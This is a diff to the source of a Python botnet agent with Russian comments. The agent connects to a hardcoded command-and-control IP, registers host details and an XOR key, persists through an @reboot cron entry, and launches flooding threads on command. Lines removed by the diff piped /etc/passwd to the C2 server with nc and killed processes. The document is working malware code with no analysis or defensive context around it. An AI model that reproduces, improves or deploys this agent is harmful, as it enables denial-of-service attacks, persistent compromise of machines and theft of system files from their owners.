@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v26.6 – автозагрузка, XOR, регулярный ping
+# AVZ-Aristo Agent v26.7 – ping, автозагрузка, xor
 import socket, json, time, os, platform, subprocess, threading, random, base64
 
 C2_HOST = "80.249.146.202"
@@ -7,7 +7,9 @@ C2_PORT = 80
 XOR_KEY = random.randint(1, 255)
 
 def xor_encrypt(data, key):
-    return bytes([b ^ key for b in data.encode()]) if isinstance(data, str) else bytes([b ^ key for b in data])
+    if isinstance(data, str):
+        data = data.encode()
+    return bytes([b ^ key for b in data])
 
 def xor_decrypt(data, key):
     return xor_encrypt(data, key)
@@ -21,7 +23,6 @@ def get_info():
     }
 
 def auto_start():
-    """Добавляет агент в автозагрузку."""
     try:
         if platform.system() == 'Linux':
             cron_line = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)} &\n"
@@ -41,13 +42,12 @@ def register():
     try:
         s = socket.socket(); s.settimeout(5)
         s.connect((C2_HOST, C2_PORT))
-        # Отправляем XOR_KEY вместе с регистрацией
         s.sendall(json.dumps({**get_info(), "xor_key": XOR_KEY}).encode())
         s.close()
     except:
         pass
 
-def get_commands():
+def send_ping():
     try:
         s = socket.socket(); s.settimeout(5)
         s.connect((C2_HOST, C2_PORT))
@@ -64,7 +64,7 @@ def main():
     auto_start()
     register()
     while True:
-        cmds = get_commands()
+        cmds = send_ping()
         for cmd in cmds:
             if cmd.get("type") == "attack":
                 target = cmd.get("target")
@@ -77,10 +77,6 @@ def main():
                         except:
                             pass
                 threading.Thread(target=flood, daemon=True).start()
-            elif cmd.get("type") == "grab":
-                os.system("cat /etc/passwd | nc {} {}".format(C2_HOST, C2_PORT))
-            elif cmd.get("type") == "stop":
-                os.system("pkill wget; pkill python3")
         time.sleep(15)
 
 if __name__ == "__main__":
